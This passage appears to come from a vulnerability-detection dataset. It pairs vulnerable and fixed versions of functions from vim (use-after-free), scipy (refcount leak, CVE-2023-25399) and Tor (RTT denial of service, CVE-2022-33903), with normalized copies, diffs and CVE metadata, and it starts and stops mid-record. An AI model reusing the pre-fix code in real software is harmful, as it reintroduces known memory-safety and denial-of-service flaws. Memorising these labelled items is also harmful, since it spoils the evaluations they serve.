		if (!shortmess(SHM_SEARCH))
		    give_warning((char_u *)_(top_bot_msg), TRUE);
	    }
	    capcol = -1;
	}
	else
	{
	    if (lnum < wp->w_buffer->b_ml.ml_line_count)
		++lnum;
	    else if (!p_ws)
		break;	    // at first line and 'nowrapscan'
	    else
	    {
		// Wrap around to the start of the buffer.  May search the
		// starting line again and accept the first match.
		lnum = 1;
		wrapped = TRUE;
		if (!shortmess(SHM_SEARCH))
		    give_warning((char_u *)_(bot_top_msg), TRUE);
	    }

	    // If we are back at the starting line and there is no match then
	    // give up.
	    if (lnum == wp->w_cursor.lnum && !found_one)
		break;

	    // Skip the characters at the start of the next line that were
	    // included in a match crossing line boundaries.
	    if (attr == HLF_COUNT)
		skip = (int)(p - endp);
	    else
		skip = 0;

	    // Capcol skips over the inserted space.
	    --capcol;

	    // But after empty line check first word in next line
	    if (empty_line)
		capcol = 0;
	}

	line_breakcheck();
    }

    vim_free(buf);
    return 0;
}","int
spell_move_to(
    win_T	*VAR_0,
    int		VAR_1,		/* COMMENT_0 */
    int		VAR_2,	/* COMMENT_1 */
    int		VAR_3,
    hlf_T	*VAR_4)		/* COMMENT_2 */
				/* COMMENT_3 */
{
    linenr_T	VAR_5;
    pos_T	VAR_6;
    int		VAR_7 = 0;
    char_u	*VAR_8;
    char_u	*VAR_9;
    char_u	*VAR_10;
    hlf_T	VAR_11 = 0;
    int		VAR_12;
#ifdef VAR_13
    int		VAR_14 = syntax_present(VAR_0);
#endif
    int		VAR_15;
    int		VAR_16;
    char_u	*VAR_17 = NULL;
    int		VAR_18 = 0;
    int		VAR_19 = 0;
    int		VAR_20 = -1;
    int		VAR_21 = FALSE;
    int		VAR_22 = FALSE;

    if (no_spell_checking(VAR_0))
	return 0;

    /* COMMENT_4 */
                                                                            
                                                                   
      
                                                                         
                                                        
      
                                                                            
                                                                            
                
       
    VAR_5 = VAR_0->w_cursor.lnum;
    CLEAR_POS(&VAR_6);

    while (!VAR_23)
    {
	int VAR_24;

	VAR_8 = ml_get_buf(VAR_0->w_buffer, VAR_5, FALSE);

	VAR_12 = (int)STRLEN(VAR_8);
	if (VAR_18 < VAR_12 + VAR_25 + 2)
	{
	    vim_free(VAR_17);
	    VAR_18 = VAR_12 + VAR_25 + 2;
	    VAR_17 = alloc(VAR_18);
	    if (VAR_17 == NULL)
		break;
	}

	/* COMMENT_14 */
	if (VAR_5 == 1)
	    VAR_20 = 0;

	/* COMMENT_15 */
	if (VAR_20 == 0)
	    VAR_20 = getwhitecols(VAR_8);
	else if (VAR_3 && VAR_0 == VAR_26)
	{
	    /* COMMENT_16 */
	    VAR_15 = getwhitecols(VAR_8);
	    if (check_need_cap(VAR_5, VAR_15))
		VAR_20 = VAR_15;

	    /* COMMENT_17 */
	    /* COMMENT_18 */
	    VAR_8 = ml_get_buf(VAR_0->w_buffer, VAR_5, FALSE);
	}

	/* COMMENT_19 */
	/* COMMENT_20 */
	/* COMMENT_21 */
	VAR_24 = *skipwhite(VAR_8) == VAR_27;
	STRCPY(VAR_17, VAR_8);
	if (VAR_5 < VAR_0->w_buffer->b_ml.ml_line_count)
	    spell_cat_line(VAR_17 + STRLEN(VAR_17),
			  ml_get_buf(VAR_0->w_buffer, VAR_5 + 1, FALSE), VAR_25);

	VAR_9 = VAR_17 + VAR_19;
	VAR_10 = VAR_17 + VAR_12;
	while (VAR_9 < VAR_10)
	{
	    /* COMMENT_22 */
	    /* COMMENT_23 */
	    if (VAR_1 == VAR_28
		    && VAR_5 == VAR_0->w_cursor.lnum
		    && !VAR_22
		    && (VAR_29)(VAR_9 - VAR_17) >= VAR_0->w_cursor.col)
		break;

	    /* COMMENT_24 */
	    VAR_11 = VAR_30;
	    VAR_12 = spell_check(VAR_0, VAR_9, &VAR_11, &VAR_20, FALSE);

	    if (VAR_11 != VAR_30)
	    {
		/* COMMENT_25 */
		if (VAR_2 || VAR_11 == VAR_31)
		{
		    /* COMMENT_26 */
		    /* COMMENT_27 */
		    if (VAR_1 == VAR_28
			    || VAR_5 != VAR_0->w_cursor.lnum
			    || (VAR_22
				|| (VAR_29)(VAR_3 ? VAR_9 - VAR_17 + VAR_12
						     : VAR_9 - VAR_17)
						  > VAR_0->w_cursor.col))
		    {
#ifdef VAR_13
			if (VAR_14)
			{
			    VAR_15 = (int)(VAR_9 - VAR_17);
			    (void)syn_get_id(VAR_0, VAR_5, (colnr_T)VAR_15,
						    FALSE, &VAR_16, FALSE);
			    if (!VAR_16)
				VAR_11 = VAR_30;
			}
			else
#endif
			    VAR_16 = TRUE;

			if (VAR_16)
			{
			    VAR_21 = TRUE;
			    VAR_6.lnum = VAR_5;
			    VAR_6.col = (int)(VAR_9 - VAR_17);
			    VAR_6.coladd = 0;
			    if (VAR_1 == VAR_32)
			    {
				/* COMMENT_28 */
				VAR_0->w_cursor = VAR_6;
				vim_free(VAR_17);
				if (VAR_4 != NULL)
				    *VAR_4 = VAR_11;
				return VAR_12;
			    }
			    else if (VAR_3)
				/* COMMENT_29 */
				/* COMMENT_30 */
				VAR_6.col += VAR_12;
			    VAR_7 = VAR_12;
			}
		    }
		    else
			VAR_21 = TRUE;
		}
	    }

	    /* COMMENT_31 */
	    VAR_9 += VAR_12;
	    VAR_20 -= VAR_12;
	}

	if (VAR_1 == VAR_28 && VAR_6.lnum != 0)
	{
	    /* COMMENT_32 */
	    VAR_0->w_cursor = VAR_6;
	    vim_free(VAR_17);
	    return VAR_7;
	}

	if (VAR_3)
	    break;	/* COMMENT_33 */

	/* COMMENT_34 */
	/* COMMENT_35 */
	if (VAR_5 == VAR_0->w_cursor.lnum && VAR_22)
	    break;

	/* COMMENT_36 */
	if (VAR_1 == VAR_28)
	{
	    if (VAR_5 > 1)
		--VAR_5;
	    else if (!VAR_33)
		break;	    /* COMMENT_37 */
	    else
	    {
		/* COMMENT_38 */
		/* COMMENT_39 */
		VAR_5 = VAR_0->w_buffer->b_ml.ml_line_count;
		VAR_22 = TRUE;
		if (!shortmess(VAR_34))
		    give_warning((char_u *)_(VAR_35), TRUE);
	    }
	    VAR_20 = -1;
	}
	else
	{
	    if (VAR_5 < VAR_0->w_buffer->b_ml.ml_line_count)
		++VAR_5;
	    else if (!VAR_33)
		break;	    /* COMMENT_37 */
	    else
	    {
		/* COMMENT_40 */
		/* COMMENT_41 */
		VAR_5 = 1;
		VAR_22 = TRUE;
		if (!shortmess(VAR_34))
		    give_warning((char_u *)_(VAR_36), TRUE);
	    }

	    /* COMMENT_42 */
	    /* COMMENT_43 */
	    if (VAR_5 == VAR_0->w_cursor.lnum && !VAR_21)
		break;

	    /* COMMENT_44 */
	    /* COMMENT_45 */
	    if (VAR_11 == VAR_30)
		VAR_19 = (int)(VAR_9 - VAR_10);
	    else
		VAR_19 = 0;

	    /* COMMENT_46 */
	    --VAR_20;

	    /* COMMENT_47 */
	    if (VAR_24)
		VAR_20 = 0;
	}

	line_breakcheck();
    }

    vim_free(VAR_17);
    return 0;
}",vim/2813f38e021c6e6581c0c88fcf107e41788bc835/spell.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -13,7 +13,7 @@
     char_u	*line;
     char_u	*p;
     char_u	*endp;
-    hlf_T	attr;
+    hlf_T	attr = 0;
     int		len;
 #ifdef FEAT_SYN_HL
     int		has_syntax = syntax_present(wp);
@@ -46,6 +46,8 @@
 
     while (!got_int)
     {
+	int empty_line;
+
 	line = ml_get_buf(wp->w_buffer, lnum, FALSE);
 
 	len = (int)STRLEN(line);
@@ -78,7 +80,9 @@
 	}
 
 	// Copy the line into ""buf"" and append the start of the next line if
-	// possible.
+	// possible.  Note: this ml_get_buf() may make ""line"" invalid, check
+	// for empty line first.
+	empty_line = *skipwhite(line) == NUL;
 	STRCPY(buf, line);
 	if (lnum < wp->w_buffer->b_ml.ml_line_count)
 	    spell_cat_line(buf + STRLEN(buf),
@@ -225,7 +229,7 @@
 	    --capcol;
 
 	    // But after empty line check first word in next line
-	    if (*skipwhite(line) == NUL)
+	    if (empty_line)
 		capcol = 0;
 	}
 ","{'deleted_lines': ['    hlf_T\tattr;', '\t// possible.', '\t    if (*skipwhite(line) == NUL)'], 'added_lines': ['    hlf_T\tattr = 0;', '\tint empty_line;', '', '\t// possible.  Note: this ml_get_buf() may make ""line"" invalid, check', '\t// for empty line first.', '\tempty_line = *skipwhite(line) == NUL;', '\t    if (empty_line)']}",True,Use After Free in GitHub repository vim/vim prior to 8.2.,7.8,HIGH,2,valid,2022-06-09T18:54:24Z,4
CVE-2023-25399,['CWE-Other'],CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H,1,scipy,"BUG: fix a minor refcounting issue in `Py_FindObjects`

Closes gh-16235

Note: also change `Py_XDECREF`s for start/end variables to `Py_DECREF`,
because it's already checked higher up that those variables are not
NULL.",9b6521198c4f31d3f9cb525e581bea8e3e77f0a2,https://github.com/scipy/scipy/commit/9b6521198c4f31d3f9cb525e581bea8e3e77f0a2,scipy/ndimage/src/nd_image.c,Py_FindObjects,"static PyObject *Py_FindObjects(PyObject *obj, PyObject *args)
{
PyArrayObject *input = NULL;
PyObject *result = NULL, *tuple = NULL, *start = NULL, *end = NULL;
PyObject *slc = NULL;
int jj;
npy_intp max_label;
npy_intp ii, *regions = NULL;
if (!PyArg_ParseTuple(args, ""O&n"",
NI_ObjectToInputArray, &input, &max_label))
goto exit;
if (max_label < 0)
max_label = 0;
if (max_label > 0) {
if (PyArray_NDIM(input) > 0) {
regions = (npy_intp*)malloc(2 * max_label * PyArray_NDIM(input) *
sizeof(npy_intp));
} else {
regions = (npy_intp*)malloc(max_label * sizeof(npy_intp));
}
if (!regions) {
PyErr_NoMemory();
goto exit;
}
}
if (!NI_FindObjects(input, max_label, regions))
goto exit;
result = PyList_New(max_label);
if (!result) {
PyErr_NoMemory();
goto exit;
}
for(ii = 0; ii < max_label; ii++) {
npy_intp idx =
PyArray_NDIM(input) > 0 ? 2 * PyArray_NDIM(input) * ii : ii;
if (regions[idx] >= 0) {
PyObject *tuple = PyTuple_New(PyArray_NDIM(input));
if (!tuple) {
PyErr_NoMemory();
goto exit;
}
for(jj = 0; jj < PyArray_NDIM(input); jj++) {
start = PyLong_FromSsize_t(regions[idx + jj]);
end = PyLong_FromSsize_t(regions[idx + jj +
PyArray_NDIM(input)]);
if (!start || !end) {
PyErr_NoMemory();
goto exit;
}
slc = PySlice_New(start, end, NULL);
if (!slc) {
PyErr_NoMemory();
goto exit;
}
Py_XDECREF(start);
Py_XDECREF(end);
start = end = NULL;
PyTuple_SetItem(tuple, jj, slc);
slc = NULL;
}
PyList_SetItem(result, ii, tuple);
tuple = NULL;
} else {
Py_INCREF(Py_None);
PyList_SetItem(result, ii, Py_None);
}
}
Py_INCREF(result);
exit:
Py_XDECREF(input);
Py_XDECREF(result);
Py_XDECREF(tuple);
Py_XDECREF(start);
Py_XDECREF(end);
Py_XDECREF(slc);
free(regions);
if (PyErr_Occurred()) {
return NULL;
} else {
return result;
}
}","static PyObject *Py_FindObjects(PyObject *VAR_0, PyObject *VAR_1)
{
PyArrayObject *VAR_2 = NULL;
PyObject *VAR_3 = NULL, *VAR_4 = NULL, *VAR_5 = NULL, *VAR_6 = NULL;
PyObject *VAR_7 = NULL;
int VAR_8;
npy_intp VAR_9;
npy_intp VAR_10, *VAR_11 = NULL;
if (!PyArg_ParseTuple(VAR_1, ""O&n"",
VAR_12, &VAR_2, &VAR_9))
goto exit;
if (VAR_9 < 0)
VAR_9 = 0;
if (VAR_9 > 0) {
if (PyArray_NDIM(VAR_2) > 0) {
VAR_11 = (npy_intp*)malloc(2 * VAR_9 * PyArray_NDIM(VAR_2) *
sizeof(npy_intp));
} else {
VAR_11 = (npy_intp*)malloc(VAR_9 * sizeof(npy_intp));
}
if (!VAR_11) {
PyErr_NoMemory();
goto exit;
}
}
if (!NI_FindObjects(VAR_2, VAR_9, VAR_11))
goto exit;
VAR_3 = PyList_New(VAR_9);
if (!VAR_3) {
PyErr_NoMemory();
goto exit;
}
for(VAR_10 = 0; VAR_10 < VAR_9; VAR_10++) {
npy_intp VAR_13 =
PyArray_NDIM(VAR_2) > 0 ? 2 * PyArray_NDIM(VAR_2) * VAR_10 : VAR_10;
if (VAR_11[VAR_13] >= 0) {
PyObject *VAR_4 = PyTuple_New(PyArray_NDIM(VAR_2));
if (!VAR_4) {
PyErr_NoMemory();
goto exit;
}
for(VAR_8 = 0; VAR_8 < PyArray_NDIM(VAR_2); VAR_8++) {
VAR_5 = PyLong_FromSsize_t(VAR_11[VAR_13 + VAR_8]);
VAR_6 = PyLong_FromSsize_t(VAR_11[VAR_13 + VAR_8 +
PyArray_NDIM(VAR_2)]);
if (!VAR_5 || !VAR_6) {
PyErr_NoMemory();
goto exit;
}
VAR_7 = PySlice_New(VAR_5, VAR_6, NULL);
if (!VAR_7) {
PyErr_NoMemory();
goto exit;
}
Py_XDECREF(VAR_5);
Py_XDECREF(VAR_6);
VAR_5 = VAR_6 = NULL;
PyTuple_SetItem(VAR_4, VAR_8, VAR_7);
VAR_7 = NULL;
}
PyList_SetItem(VAR_3, VAR_10, VAR_4);
VAR_4 = NULL;
} else {
Py_INCREF(VAR_14);
PyList_SetItem(VAR_3, VAR_10, VAR_14);
}
}
Py_INCREF(VAR_3);
exit:
Py_XDECREF(VAR_2);
Py_XDECREF(VAR_3);
Py_XDECREF(VAR_4);
Py_XDECREF(VAR_5);
Py_XDECREF(VAR_6);
Py_XDECREF(VAR_7);
free(VAR_11);
if (PyErr_Occurred()) {
return NULL;
} else {
return VAR_3;
}
}",scipy/9b6521198c4f31d3f9cb525e581bea8e3e77f0a2/nd_image.c/vul/before/0.json,"static PyObject *Py_FindObjects(PyObject *obj, PyObject *args)
{
    PyArrayObject *input = NULL;
    PyObject *result = NULL, *tuple = NULL, *start = NULL, *end = NULL;
    PyObject *slc = NULL;
    int jj;
    npy_intp max_label;
    npy_intp ii, *regions = NULL;

    if (!PyArg_ParseTuple(args, ""O&n"",
                          NI_ObjectToInputArray, &input, &max_label))
        goto exit;

    if (max_label < 0)
        max_label = 0;
    if (max_label > 0) {
        if (PyArray_NDIM(input) > 0) {
            regions = (npy_intp*)malloc(2 * max_label * PyArray_NDIM(input) *
                                        sizeof(npy_intp));
        } else {
            regions = (npy_intp*)malloc(max_label * sizeof(npy_intp));
        }
        if (!regions) {
            PyErr_NoMemory();
            goto exit;
        }
    }

    if (!NI_FindObjects(input, max_label, regions))
        goto exit;

    result = PyList_New(max_label);
    if (!result) {
        PyErr_NoMemory();
        goto exit;
    }

    for(ii = 0; ii < max_label; ii++) {
        npy_intp idx =
                PyArray_NDIM(input) > 0 ? 2 * PyArray_NDIM(input) * ii : ii;
        if (regions[idx] >= 0) {
            tuple = PyTuple_New(PyArray_NDIM(input));
            if (!tuple) {
                PyErr_NoMemory();
                goto exit;
            }
            for(jj = 0; jj < PyArray_NDIM(input); jj++) {
                start = PyLong_FromSsize_t(regions[idx + jj]);
                end = PyLong_FromSsize_t(regions[idx + jj +
                                             PyArray_NDIM(input)]);
                if (!start || !end) {
                    PyErr_NoMemory();
                    goto exit;
                }
                slc = PySlice_New(start, end, NULL);
                if (!slc) {
                    PyErr_NoMemory();
                    goto exit;
                }
                Py_DECREF(start);
                Py_DECREF(end);
                start = end = NULL;
                PyTuple_SetItem(tuple, jj, slc);
                slc = NULL;
            }
            PyList_SetItem(result, ii, tuple);
            tuple = NULL;
        } else {
            Py_INCREF(Py_None);
            PyList_SetItem(result, ii, Py_None);
        }
    }

    Py_INCREF(result);

 exit:
    Py_XDECREF(input);
    Py_XDECREF(result);
    Py_XDECREF(tuple);
    Py_XDECREF(start);
    Py_XDECREF(end);
    Py_XDECREF(slc);
    free(regions);
    if (PyErr_Occurred()) {
        return NULL;
    } else {
        return result;
    }
}","static PyObject *Py_FindObjects(PyObject *VAR_0, PyObject *VAR_1)
{
    PyArrayObject *VAR_2 = NULL;
    PyObject *VAR_3 = NULL, *VAR_4 = NULL, *VAR_5 = NULL, *VAR_6 = NULL;
    PyObject *VAR_7 = NULL;
    int VAR_8;
    npy_intp VAR_9;
    npy_intp VAR_10, *VAR_11 = NULL;

    if (!PyArg_ParseTuple(VAR_1, ""O&n"",
                          VAR_12, &VAR_2, &VAR_9))
        goto exit;

    if (VAR_9 < 0)
        VAR_9 = 0;
    if (VAR_9 > 0) {
        if (PyArray_NDIM(VAR_2) > 0) {
            VAR_11 = (npy_intp*)malloc(2 * VAR_9 * PyArray_NDIM(VAR_2) *
                                        sizeof(npy_intp));
        } else {
            VAR_11 = (npy_intp*)malloc(VAR_9 * sizeof(npy_intp));
        }
        if (!VAR_11) {
            PyErr_NoMemory();
            goto exit;
        }
    }

    if (!NI_FindObjects(VAR_2, VAR_9, VAR_11))
        goto exit;

    VAR_3 = PyList_New(VAR_9);
    if (!VAR_3) {
        PyErr_NoMemory();
        goto exit;
    }

    for(VAR_10 = 0; VAR_10 < VAR_9; VAR_10++) {
        npy_intp VAR_13 =
                PyArray_NDIM(VAR_2) > 0 ? 2 * PyArray_NDIM(VAR_2) * VAR_10 : VAR_10;
        if (VAR_11[VAR_13] >= 0) {
            VAR_4 = PyTuple_New(PyArray_NDIM(VAR_2));
            if (!VAR_4) {
                PyErr_NoMemory();
                goto exit;
            }
            for(VAR_8 = 0; VAR_8 < PyArray_NDIM(VAR_2); VAR_8++) {
                VAR_5 = PyLong_FromSsize_t(VAR_11[VAR_13 + VAR_8]);
                VAR_6 = PyLong_FromSsize_t(VAR_11[VAR_13 + VAR_8 +
                                             PyArray_NDIM(VAR_2)]);
                if (!VAR_5 || !VAR_6) {
                    PyErr_NoMemory();
                    goto exit;
                }
                VAR_7 = PySlice_New(VAR_5, VAR_6, NULL);
                if (!VAR_7) {
                    PyErr_NoMemory();
                    goto exit;
                }
                Py_DECREF(VAR_5);
                Py_DECREF(VAR_6);
                VAR_5 = VAR_6 = NULL;
                PyTuple_SetItem(VAR_4, VAR_8, VAR_7);
                VAR_7 = NULL;
            }
            PyList_SetItem(VAR_3, VAR_10, VAR_4);
            VAR_4 = NULL;
        } else {
            Py_INCREF(VAR_14);
            PyList_SetItem(VAR_3, VAR_10, VAR_14);
        }
    }

    Py_INCREF(VAR_3);

 exit:
    Py_XDECREF(VAR_2);
    Py_XDECREF(VAR_3);
    Py_XDECREF(VAR_4);
    Py_XDECREF(VAR_5);
    Py_XDECREF(VAR_6);
    Py_XDECREF(VAR_7);
    free(VAR_11);
    if (PyErr_Occurred()) {
        return NULL;
    } else {
        return VAR_3;
    }
}",scipy/9b6521198c4f31d3f9cb525e581bea8e3e77f0a2/nd_image.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -39,7 +39,7 @@
         npy_intp idx =
                 PyArray_NDIM(input) > 0 ? 2 * PyArray_NDIM(input) * ii : ii;
         if (regions[idx] >= 0) {
-            PyObject *tuple = PyTuple_New(PyArray_NDIM(input));
+            tuple = PyTuple_New(PyArray_NDIM(input));
             if (!tuple) {
                 PyErr_NoMemory();
                 goto exit;
@@ -57,8 +57,8 @@
                     PyErr_NoMemory();
                     goto exit;
                 }
-                Py_XDECREF(start);
-                Py_XDECREF(end);
+                Py_DECREF(start);
+                Py_DECREF(end);
                 start = end = NULL;
                 PyTuple_SetItem(tuple, jj, slc);
                 slc = NULL;","{'deleted_lines': ['            PyObject *tuple = PyTuple_New(PyArray_NDIM(input));', '                Py_XDECREF(start);', '                Py_XDECREF(end);'], 'added_lines': ['            tuple = PyTuple_New(PyArray_NDIM(input));', '                Py_DECREF(start);', '                Py_DECREF(end);']}",True,A refcounting issue which leads to potential memory leak was discovered in scipy commit 8627df31ab in Py_FindObjects() function.,5.5,MEDIUM,1,valid,2022-06-13T18:12:00Z,4
CVE-2022-33903,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,torproject/tor,"Fix for RTT calculation hang during congestion control.

Only cache RTT on explicit stalls; Only use this cache for the
RTT decrease case. Otherwise use only local circuit RTT state for clock jump
checks.",b0496d40197dd5b4fb7b694c1410082d4e34dda6,https://github.com/torproject/tor/commit/b0496d40197dd5b4fb7b694c1410082d4e34dda6,src/core/or/congestion_control_common.c,time_delta_should_use_heuristics,"static bool
time_delta_should_use_heuristics(const congestion_control_t *cc)
{
if (!cc->in_slow_start) {
return true;
}
if (cc->bdp[BDP_ALG_SENDME_RATE]) {
return true;
}
return false;
}","static bool
time_delta_should_use_heuristics(const congestion_control_t *VAR_0)
{
if (!VAR_0->in_slow_start) {
return true;
}
if (VAR_0->bdp[VAR_1]) {
return true;
}
return false;
}",torproject/tor/b0496d40197dd5b4fb7b694c1410082d4e34dda6/congestion_control_common.c/vul/before/1.json,"static bool
time_delta_should_use_heuristics(const congestion_control_t *cc)
{
  /* If we have exited slow start and also have an EWMA RTT, we
   * should have processed at least a cwnd worth of RTTs */
  if (!cc->in_slow_start && cc->ewma_rtt_usec) {
    return true;
  }

  /* If we managed to get enough acks to estimate a SENDME BDP, then
   * we have enough to estimate clock jumps relative to a baseline,
   * too. (This is at least 'cc_bwe_min' acks). */
  if (cc->bdp[BDP_ALG_SENDME_RATE]) {
    return true;
  }

  /* Not enough data to estimate clock jumps */
  return false;
}","static bool
time_delta_should_use_heuristics(const congestion_control_t *VAR_0)
{
  /* COMMENT_0 */
                                                           
  if (!VAR_0->in_slow_start && VAR_0->ewma_rtt_usec) {
    return true;
  }

  /* COMMENT_2 */
                                                                   
                                                  
  if (VAR_0->bdp[VAR_1]) {
    return true;
  }

  /* COMMENT_5 */
  return false;
}",torproject/tor/b0496d40197dd5b4fb7b694c1410082d4e34dda6/congestion_control_common.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,10 +1,9 @@
 static bool
 time_delta_should_use_heuristics(const congestion_control_t *cc)
 {
-
-  /* If we have exited slow start, we should have processed at least
-   * a cwnd worth of RTTs */
-  if (!cc->in_slow_start) {
+  /* If we have exited slow start and also have an EWMA RTT, we
+   * should have processed at least a cwnd worth of RTTs */
+  if (!cc->in_slow_start && cc->ewma_rtt_usec) {
     return true;
   }
 ","{'deleted_lines': ['', '  /* If we have exited slow start, we should have processed at least', '   * a cwnd worth of RTTs */', '  if (!cc->in_slow_start) {'], 'added_lines': ['  /* If we have exited slow start and also have an EWMA RTT, we', '   * should have processed at least a cwnd worth of RTTs */', '  if (!cc->in_slow_start && cc->ewma_rtt_usec) {']}",True,Tor 0.4.7.x before 0.4.7.8 allows a denial of service via the wedging of RTT estimation.,7.5,HIGH,2,valid,2022-06-14T20:59:03Z,4
CVE-2022-33903,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,torproject/tor,"Fix for RTT calculation hang during congestion control.

Only cache RTT on explicit stalls; Only use this cache for the
RTT decrease case. Otherwise use only local circuit RTT state for clock jump
checks.",b0496d40197dd5b4fb7b694c1410082d4e34dda6,https://github.com/torproject/tor/commit/b0496d40197dd5b4fb7b694c1410082d4e34dda6,src/core/or/congestion_control_common.c,time_delta_stalled_or_jumped,"static bool
time_delta_stalled_or_jumped(const congestion_control_t *cc,
uint64_t old_delta, uint64_t new_delta)
{
#define DELTA_DISCREPENCY_RATIO_MAX 5000
if (new_delta == 0) {
static ratelim_t stall_info_limit = RATELIM_INIT(60);
log_fn_ratelim(&stall_info_limit, LOG_INFO, LD_CIRC,
""Congestion control cannot measure RTT due to monotime stall."");
is_monotime_clock_broken = true;
return is_monotime_clock_broken;
}
if (old_delta == 0) {
return is_monotime_clock_broken;
}
if (!time_delta_should_use_heuristics(cc)) {
return is_monotime_clock_broken;
}
if (old_delta > new_delta * DELTA_DISCREPENCY_RATIO_MAX) {
static ratelim_t dec_notice_limit = RATELIM_INIT(300);
log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,
""Sudden decrease in circuit RTT (%""PRIu64"" vs %""PRIu64
""), likely due to clock jump."",
new_delta/1000, old_delta/1000);
is_monotime_clock_broken = true;
return is_monotime_clock_broken;
}
if (new_delta > old_delta * DELTA_DISCREPENCY_RATIO_MAX) {
static ratelim_t dec_notice_limit = RATELIM_INIT(300);
log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,
""Sudden increase in circuit RTT (%""PRIu64"" vs %""PRIu64
""), likely due to clock jump."",
new_delta/1000, old_delta/1000);
is_monotime_clock_broken = true;
return is_monotime_clock_broken;
}
is_monotime_clock_broken = false;
return is_monotime_clock_broken;
}","static bool
time_delta_stalled_or_jumped(const congestion_control_t *VAR_0,
uint64_t VAR_1, uint64_t VAR_2)
{
#define VAR_3 5000
if (VAR_2 == 0) {
static ratelim_t VAR_4 = RATELIM_INIT(60);
log_fn_ratelim(&VAR_4, VAR_5, VAR_6,
""Congestion control cannot measure RTT due to monotime stall."");
VAR_7 = true;
return VAR_7;
}
if (VAR_1 == 0) {
return VAR_7;
}
if (!time_delta_should_use_heuristics(VAR_0)) {
return VAR_7;
}
if (VAR_1 > VAR_2 * VAR_3) {
static ratelim_t VAR_8 = RATELIM_INIT(300);
log_fn_ratelim(&VAR_8, VAR_9, VAR_6,
""Sudden decrease in circuit RTT (%""VAR_10"" vs %""VAR_10
""), likely due to clock jump."",
VAR_2/1000, VAR_1/1000);
VAR_7 = true;
return VAR_7;
}
if (VAR_2 > VAR_1 * VAR_3) {
static ratelim_t VAR_8 = RATELIM_INIT(300);
log_fn_ratelim(&VAR_8, VAR_9, VAR_6,
""Sudden increase in circuit RTT (%""VAR_10"" vs %""VAR_10
""), likely due to clock jump."",
VAR_2/1000, VAR_1/1000);
VAR_7 = true;
return VAR_7;
}
VAR_7 = false;
return VAR_7;
}",torproject/tor/b0496d40197dd5b4fb7b694c1410082d4e34dda6/congestion_control_common.c/vul/before/0.json,"static bool
time_delta_stalled_or_jumped(const congestion_control_t *cc,
                             uint64_t old_delta, uint64_t new_delta)
{
#define DELTA_DISCREPENCY_RATIO_MAX 5000
  /* If we have a 0 new_delta, that is definitely a monotime stall */
  if (new_delta == 0) {
    static ratelim_t stall_info_limit = RATELIM_INIT(60);
    log_fn_ratelim(&stall_info_limit, LOG_INFO, LD_CIRC,
           ""Congestion control cannot measure RTT due to monotime stall."");

    is_monotime_clock_broken = true;
    return true;
  }

  /*
   * For the heuristic cases, we need at least a few timestamps,
   * to average out any previous partial stalls or jumps. So until
   * that point, let's just assume its OK.
   */
  if (!time_delta_should_use_heuristics(cc)) {
    return false;
  }

  /* If old_delta is significantly larger than new_delta, then
   * this means that the monotime clock could have recently
   * stopped moving forward. However, use the cache for this
   * value, because it may also be caused by network activity,
   * or by a previous clock jump that was not detected.
   *
   * So if we have not gotten a 0-delta recently, we will
   * still allow this new low RTT, but just yell about it. */
  if (old_delta > new_delta * DELTA_DISCREPENCY_RATIO_MAX) {
    static ratelim_t dec_notice_limit = RATELIM_INIT(300);
    log_fn_ratelim(&dec_notice_limit, LOG_NOTICE, LD_CIRC,
           ""Sudden decrease in circuit RTT (%""PRIu64"" vs %""PRIu64
           ""), likely due to clock jump."",
           new_delta/1000, old_delta/1000);

    return is_monotime_clock_broken;
  }

  /* If new_delta is significantly larger than old_delta, then
   * this means that the monotime clock suddenly jumped forward.
   * However, do not cache this value, because it may also be caused
   * by network activity.
   */
  if (new_delta > old_delta * DELTA_DISCREPENCY_RATIO_MAX) {
    static ratelim_t dec_notice_limit = RATELIM_INIT(300);
    log_fn_ratelim(&dec_notice_limit, LOG_PROTOCOL_WARN, LD_CIRC,
           ""Sudden increase in circuit RTT (%""PRIu64"" vs %""PRIu64
           ""), likely due to clock jump or suspended remote endpoint."",
           new_delta/1000, old_delta/1000);

    return true;
  }

  /* All good! Update cached status, too */
  is_monotime_clock_broken = false;

  return false;
}","static bool
time_delta_stalled_or_jumped(const congestion_control_t *VAR_0,
                             uint64_t VAR_1, uint64_t VAR_2)
{
#define VAR_3 5000
  /* COMMENT_0 */
  if (VAR_2 == 0) {
    static ratelim_t VAR_4 = RATELIM_INIT(60);
    log_fn_ratelim(&VAR_4, VAR_5, VAR_6,
           ""Congestion control cannot measure RTT due to monotime stall."");

    VAR_7 = true;
    return true;
  }

  /* COMMENT_1 */
                                                                
                                                                  
                                          
     
  if (!time_delta_should_use_heuristics(VAR_0)) {
    return false;
  }

  /* COMMENT_6 */
                                                           
                                                            
                                                              
                                                       
    
                                                         
                                                             
  if (VAR_1 > VAR_2 * VAR_3) {
    static ratelim_t VAR_8 = RATELIM_INIT(300);
    log_fn_ratelim(&VAR_8, VAR_9, VAR_6,
           ""Sudden decrease in circuit RTT (%""VAR_10"" vs %""VAR_10
           ""), likely due to clock jump."",
           VAR_2/1000, VAR_1/1000);

    return VAR_7;
  }

  /* COMMENT_14 */
                                                                
                                                                    
                         
     
  if (VAR_2 > VAR_1 * VAR_3) {
    static ratelim_t VAR_8 = RATELIM_INIT(300);
    log_fn_ratelim(&VAR_8, VAR_11, VAR_6,
           ""Sudden increase in circuit RTT (%""VAR_10"" vs %""VAR_10
           ""), likely due to clock jump or suspended remote endpoint."",
           VAR_2/1000, VAR_1/1000);

    return true;
  }

  /* COMMENT_19 */
  VAR_7 = false;

  return false;
}",torproject/tor/b0496d40197dd5b4fb7b694c1410082d4e34dda6/congestion_control_common.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -9,34 +9,27 @@
     log_fn_ratelim(&stall_info_limit, LOG_INFO, LD_CIRC,
            ""Congestion control cannot measure RTT due to monotime stall."");
 
-    /* If delta is every 0, the monotime clock has stalled, and we should
-     * not use it anywhere. */
     is_monotime_clock_broken = true;
-
-    return is_monotime_clock_broken;
-  }
-
-  /* If the old_delta is 0, we have no previous values on this circuit.
-   *
-   * So, return the global monotime status from other circuits, and
-   * do not update.
-   */
